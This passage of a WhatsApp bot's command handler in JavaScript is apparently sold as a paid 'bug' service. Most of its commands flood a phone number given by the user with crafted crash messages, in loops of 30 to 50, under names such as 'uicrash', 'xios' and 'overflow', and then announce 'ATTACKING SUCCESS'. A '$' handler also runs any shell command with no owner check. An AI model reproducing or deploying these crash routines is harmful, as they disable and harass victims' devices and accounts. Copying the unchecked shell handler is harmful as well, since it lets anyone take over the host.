        } catch (err) {
            // Handle individual group failures silently
        }
        await sleep(global.delayjpm);
    }
    
    m.reply(`Successfully sent messages to *${total} groups*.`);
}
break;

case 'payment': {
let teks = `${monospace("PAYMENT")}

*(E-WALLET)*

   *DANA*
- ${dana}

Harap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You

© ${storename}`
byxx.sendMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": false,
"title": `QRIS? KLIK DISINI`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://b.top4top.io/p_3194nb6rt0.jpeg",
"sourceUrl": `${qris}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
}
      break

case "sticker": 
case "stiker":
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await byxx.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await byxx.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'bluedid': case 'crazy': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(byxx, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(byxx, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'longtrip': case 'might': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(byxx, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(byxx, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'galaxy': case 'invictus': case 'univers': case 'angkasa': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await beta2(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'abyykeren': case 'abyyhard': case 'abyycogan': case 'abyycrt': case 'abyybantai': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await beta2(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'bijihard': case 'bokepros': case 'anjingliar':  
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await beta2(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'autocrash': case 'pornhub': case 'ahhcrot':  
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await beta2(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'vip': case 'attack': case 'andro': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(byxx, target, "Sv Abyy Modss 🦠🩸", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(byxx, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'uisystem': case 'uicrash': case 'bugui': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await beta2(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'device': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await beta1(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'xzett': case 'xvrezx': case 'xvzzar': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await beta2(byxx, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'xios': case 'iphone': case 'xip':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await beta2(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'overflow': case 'vasion': case 'crashflow': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await sendQP(target, wanted)
await beta1(byxx, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case "owner": {
    if (!isPremium) return reply('What do you want, kid?');
    
    const ownerNumber = '2347041039367@s.whatsapp.net'; // Owner's contact
    
    const repf = await byxx.sendMessage(from, {
        contacts: {
            displayName: "Owner Contact",
            contacts: [{ displayName: "Owner", vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:BLUE DEMON\nTEL;waid=2347041039367:+234 704 103 9367\nEND:VCARD` }]
        },
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            mentionedJid: [sender]
        }
    }, { quoted: m });
    
    byxx.sendMessage(from, {
        text: `*HERE’S MY OWNER, DON’T MESS AROUND!*`,
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            mentionedJid: [sender]
        }
    }, { quoted: repf });
}
break;

case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await byxx.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break

case 'setowner': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} 62×××`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
}
break

case 'self': {
if (!isOwner) return reply(mess.only.owner)
byxx.public = false
reply(' *\`Private mode activated\`* ')
}
break

case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await byxx.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case 'public': {
if (!isOwner) return reply(mess.only.owner)
byxx.public = true
reply(' *\`Public mode activated\`* ')
}
break

case "qc": {
if (!isOwner)return reply(mess.only.owner)
if (!quoted){
const getname = await byxx.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
byxx.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
byxx.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} byxxTzy`)
}
}
break

case 'mangap': {
reply(`*Thank you,${pushname} For the compliment*`) 
}
break

case 'ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} Who was the person who discovered the computer in the Majapahit era?`);  
await byxx.sendMessage(m.chat, { react: { text: "🤔",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> ʙʟᴜᴇ-ᴛᴇᴄʜ - AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/bluexx.jpg')}, { upload: byxx.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
"buttonParamsJson": `{"display_text":"ᴄᴏᴏʟ-ᴀɪ","id":".mangap"}`
            }],
          }),
          contextInfo: {
  mentionedJid: [m.sender], 
  forwardingScore: 999,
  isForwarded: true,
forwardedNewsletterMessageInfo: {
  newsletterJid: '0@newsletter',
  newsletterName: namabot,
  serverMessageId: 143
}
}
       })
    }
  }
}, { quoted: m })
await byxx.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("Error Kak :(")
}
}
break

case 'bluebutton': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
				let sections = [{
						title: '⌜ 𝐗 𝐁𝐔𝐆𝐗𝐙 ⌟',
						highlight_label: "⚡⃟༑⌁⃰𝐢𝖝͢𝚎𝚗̮𝚘ཀ͜͡🔥",
						rows: [{
							title: '𝐗͢𝐯͋𝐢͖𝐱͆𝐳',
							id: `vip ${target}`
						}]
					},
					{
						highlight_label: "⚡⃟༑⌁⃰𝐢𝖝͢𝚎𝚗̮𝚘ཀ͜͡🔥",
						rows: [{
							title: '𝐓͠𝐫͖𝐚͢𝐬𝐡 𝐋͆𝐨𝐜',
							id: `andro ${target}`
						}]
					},
					{
						highlight_label: "⚡⃟༑⌁⃰𝐢𝖝͢𝚎𝚗̮𝚘ཀ͜͡🔥",
						rows: [{
							title: '𝐈͖𝐧ͦ𝐯͢𝐚ͤʿ𝐜𝐭͡𝐮͍𝐬 𝐗',
							id: `attack ${target}`
						}]
					},
					{
					title: '⌜ 𝐗 𝐃𝐄𝐕𝐈𝐂𝐄 ⌟',
						highlight_label: "⚡⃟༑⌁⃰𝐃̴͖𝐞̶͢͠𝐯𝐢̿𝐜͍𝐞ͧཀ͜͡📱",
						rows: [{
							title: '𝐏͖͡𝐎͢͠𝐂̽͢𝐎ͣ',
							id: `xzett ${target}`
						}]
					},
					{
						highlight_label: "⚡⃟༑⌁⃰𝐃̴͖𝐞̶͢͠𝐯𝐢̿𝐜͍𝐞ͧཀ͜͡📱",
						rows: [{
							title: '͝𝐒̸𝐚͢͡𝐦̸̝͠𝐬𝐮̽͢͞𝐧𝐠ͦ',
							id: `uisystem ${target}`
						}]
					},
					{
						highlight_label: "⚡⃟༑⌁⃰𝐃̴͖𝐞̶͢͠𝐯𝐢̿𝐜͍𝐞ͧཀ͜͡📱",
						rows: [{
							title: '͝𝐎̦͍̿𝐩͈͆͢𝐩͜͡𝐨',
							id: `attack ${target}`
						}]
					},
					{
						highlight_label: "⚡⃟༑⌁⃰𝐃̴͖𝐞̶͢͠𝐯𝐢̿𝐜͍𝐞ͧཀ͜͡📱",
						rows: [{
							title: '͝𝐕̷͜𝐢̼͕𝐯̽͢͡𝐨͖',
							id: `vip ${target}`
						}]
					},
					{
						highlight_label: "⚡⃟༑⌁⃰𝐃̴͖𝐞̶͢͠𝐯𝐢̿𝐜͍𝐞ͧཀ͜͡📱",
						rows: [{
							title: '͝𝐚͢͡𝐥𝐥͍ 𝐝͓͆𝐯̈́͢𝐜͠𝐞͖',
							id: `device ${target}`
						}]
					},
					{
					title: '⌜ 𝐗 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 ⌟',
						highlight_label: "📃⃟༑⌁⃰𝐢ภ͢𝐟𝐢𝐧̿𝐢͖𝐭yཀ͜͡🦠",
						rows: [{
							title: '𝐗̳𝐳͛𝐞͢𝐭ͯ𝐭 𝐂͞𝐫͖𝐚͆𝐬ͨ𝐡',
							id: `xzett ${target}`
						}]
					},
					{
						highlight_label: "📃⃟༑⌁⃰𝐢ภ͢𝐟𝐢𝐧̿𝐢͖𝐭yཀ͜͡🦠",
						rows: [{
							title: '͝𝐗𝐯͋𝐫͢𝐞͓͐𝐳̴𝐱',
							id: `xvrezx ${target}`
						}]
					},
					{
					title: '⌜ 𝐗 𝐒𝐘𝐒𝐓𝐄𝐌 ⌟',
						highlight_label: "📌⃟༑⌁⃰𝐮͖̽͜͡𝐢 𝐜͟𝐫͡𝐚͢𝐬̾𝐡𝐞͖͆𝐝͆ཀ͜͡💊",
						rows: [{
							title: '𝐭͜𝐫͢𝐚̶͡𝐬̮𝐡˞ 𝐮͢͠𝐢',
							id: `uisystem ${target}`
						}]
					},
					{
						highlight_label: "📌⃟༑⌁⃰𝐮͖̽͜͡𝐢 𝐜͟𝐫͡𝐚͢𝐬̾𝐡𝐞͖͆𝐝͆ཀ͜͡💊",
						rows: [{
							title: '͝𝐢͆𝐧͍͡𝐯͚𝐢͢𝐜𝐭𝐮̭͠𝐬 𝐮͖͡𝐢',
							id: `uicrash ${target}`
						}]
					},
					{
						highlight_label: "📌⃟༑⌁⃰𝐮͖̽͜͡𝐢 𝐜͟𝐫͡𝐚͢𝐬̾𝐡𝐞͖͆𝐝͆ཀ͜͡💊",
						rows: [{
							title: '𝐞̷𝐱̷͢͡𝐭𝐫͠𝐦̴͟𝐞 𝐮̸̈́𝐢',
							id: `bugui ${target}`
						}]
					},
					{
						title: '⌜ 𝐗 𝐈𝐎𝐒 ⌟',
						highlight_label: "🩸⃟༑𝖝 𝖎𝖝̺𝖕͋͢𝖍𝖓ཀ͜͡☠️",
						rows: [{
							title: '𝐂̾𝐫̳˺𝐚͢𝐬𝐡 𝐈̅𝐨𝐬̪',
							id: `xios ${target}`
						}]
					},
					{
						highlight_label: "🩸⃟༑𝖝 𝖎𝖝̺𝖕͋͢𝖍𝖓ཀ͜͡☠️",
						rows: [{
							title: '𝐒̱͢͠𝐲̻𝐬͜𝐭𝐞͡𝐦 𝐈͎𝐨̽𝐬',
							id: `xip ${target}`
						}]
					},
					{
						highlight_label: "🩸⃟༑𝖝 𝖎𝖝̺𝖕͋͢𝖍𝖓ཀ͜͡☠️",
						rows: [{
							title: '𝐓͡𝐫̶̽𝐚͢𝐯̚𝐚 𝐈̋𝐨̌𝐬˿',
							id: `iphone ${target}`
						}]
					},
					{
						title: '⌜ 𝐗 𝐇𝐈𝐆𝐇 ⌟',
						highlight_label: "👾⃟༑⌁⃰𝖎͖ͧ𝖝͇͡𝖕͢𝖆͍𝖈̾𝖙ཀ͜͡🎗️",
						rows: [{
							title: '𝐂̼͡𝐫͢𝐚̽𝐬𝐡 𝐅͋𝐥͜𝐨𝐰͖',
							id: `crashflow ${target}`
						}]
					},
					{
						highlight_label: "👾⃟༑⌁⃰𝖎͖ͧ𝖝͇͡𝖕͢𝖆͍𝖈̾𝖙ཀ͜͡🎗️",
						rows: [{
							title: '𝐕̼𝐚̴ͦ͢𝐬ͥ𝐢𝐨̽𝐧͖',
							id: `vasion ${target}`
						}]
					},
					{
						highlight_label: "👾⃟༑⌁⃰𝖎͖ͧ𝖝͇͡𝖕͢𝖆͍𝖈̾𝖙ཀ͜͡🎗️",
						rows: [{
							title: '𝐎͠𝐯͢𝐞ͦ𝐫 𝐅̴̳𝐥𝐨̈́𝐰ͥ',
							id: `overflow ${target}`
						}]
					}]
let listMessage = {
    title: '⿻ ⌜ ʙʟᴜᴇ-ʙᴜᴛᴛᴏɴ͖ ⌟ ⿻', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "0@newsletter",
 newsletterName: 'Powered By Blue tech', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: byxx.decodeJid(byxx.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ``
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `⿻  ⌜ ʙʟᴜᴇ-ʙᴜᴛᴛᴏɴ ⌟  ⿻`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\nꜱᴏᴍᴇ ɢᴜʏꜱ ᴀʀᴇ ᴀʙᴏᴜᴛ ᴛᴏ ɢᴇᴛ ᴛʜᴇɪʀ ᴀꜱꜱ ᴡʜᴏᴏᴘᴇᴅ ',
 subtitle: "𝐙͈𝐞͢𝐫𝐨",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/bluexx.jpg")}, { upload: byxx.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"BLUE DEMON\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://wa.me/2347041039367\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await byxx.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('../database/lib//uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? byxx.user.jid : m.sender;
//const name = await byxx.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await byxx.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  byxx.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break

case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Example ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break

default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
byxx.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})